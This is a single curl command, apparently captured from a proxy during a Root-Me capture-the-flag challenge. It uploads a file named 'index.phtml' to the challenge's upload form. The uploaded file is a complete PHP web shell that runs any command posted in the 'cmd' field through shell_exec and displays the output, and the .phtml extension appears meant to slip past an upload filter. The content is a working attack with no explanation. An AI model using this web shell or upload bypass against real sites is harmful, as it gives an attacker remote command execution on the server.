curl -i -s -k -X $'POST'     -H $'Host: ctf02.root-me.org' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: multipart/form-data; boundary=---------------------------308122850018160020162944196534' -H $'Content-Length: 2829' -H $'Origin: http://ctf02.root-me.org' -H $'Connection: close' -H $'Referer: http://ctf02.root-me.org/e5d4cb92102d5a06/index.php' -H $'Upgrade-Insecure-Requests: 1'     -b $'_ga_SRYSKX09J7=GS1.1.1660300260.5.1.1660301356.0; _ga=GA1.1.1502028347.1660157429'     --data-binary $'-----------------------------308122850018160020162944196534\x0d\x0aContent-Disposition: form-data; name=\"file_to_upload\"; filename=\"index.phtml\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a<?php\x0aif (!empty($_POST[\'cmd\'])) {\x0a    $cmd = shell_exec($_POST[\'cmd\']);\x0a}\x0a?>\x0a<!DOCTYPE html>\x0a<html lang=\"en\">\x0a<head>\x0a    <meta charset=\"utf-8\">\x0a    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\x0a    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\x0a    <title>Web Shell</title>\x0a    <style>\x0a        * {\x0a            -webkit-box-sizing: border-box;\x0a            box-sizing: border-box;\x0a        }\x0a\x0a        body {\x0a            font-family: sans-serif;\x0a            color: rgba(0, 0, 0, .75);\x0a        }\x0a\x0a        main {\x0a            margin: auto;\x0a            max-width: 850px;\x0a        }\x0a\x0a        pre,\x0a        input,\x0a        button {\x0a            border-radius: 5px;\x0a        }\x0a\x0a        pre,\x0a        input,\x0a        button {\x0a            background-color: #efefef;\x0a        }\x0a\x0a        label {\x0a            display: block;\x0a        }\x0a\x0a        input {\x0a            width: 100%;\x0a            background-color: #efefef;\x0a            border: 2px solid transparent;\x0a        }\x0a\x0a        input:focus {\x0a            outline: none;\x0a            background: transparent;\x0a            border: 2px solid #e6e6e6;\x0a        }\x0a\x0a        button {\x0a            border: none;\x0a            cursor: pointer;\x0a            margin-left: 5px;\x0a        }\x0a\x0a        button:hover {\x0a            background-color: #e6e6e6;\x0a        }\x0a\x0a        pre,\x0a        input,\x0a        button {\x0a            padding: 10px;\x0a        }\x0a\x0a        .form-group {\x0a            display: -webkit-box;\x0a            display: -ms-flexbox;\x0a            display: flex;\x0a            padding: 15px 0;\x0a        }\x0a    </style>\x0a\x0a</head>\x0a\x0a<body>\x0a    <main>\x0a        <h1>Web Shell</h1>\x0a        <h2>Execute a command</h2>\x0a\x0a        <form method=\"post\">\x0a            <label for=\"cmd\"><strong>Command</strong></label>\x0a            <div class=\"form-group\">\x0a                <input type=\"text\" name=\"cmd\" id=\"cmd\" value=\"<?= htmlspecialchars($_POST[\'cmd\'], ENT_QUOTES, \'UTF-8\') ?>\"\x0a                       onfocus=\"this.setSelectionRange(this.value.length, this.value.length);\" autofocus required>\x0a                <button type=\"submit\">Execute</button>\x0a            </div>\x0a        </form>\x0a\x0a        <?php if ($_SERVER[\'REQUEST_METHOD\'] === \'POST\'): ?>\x0a            <h2>Output</h2>\x0a            <?php if (isset($cmd)): ?>\x0a                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, \'UTF-8\') ?></pre>\x0a            <?php else: ?>\x0a                <pre><small>No result.</small></pre>\x0a            <?php endif; ?>\x0a        <?php endif; ?>\x0a    </main>\x0a</body>\x0a</html>\x0d\x0a-----------------------------308122850018160020162944196534\x0d\x0aContent-Disposition: form-data; name=\"submit\"\x0d\x0a\x0d\x0aEnvoyer\x0d\x0a-----------------------------308122850018160020162944196534--\x0d\x0a'     $'http://ctf02.root-me.org/e5d4cb92102d5a06/index.php'
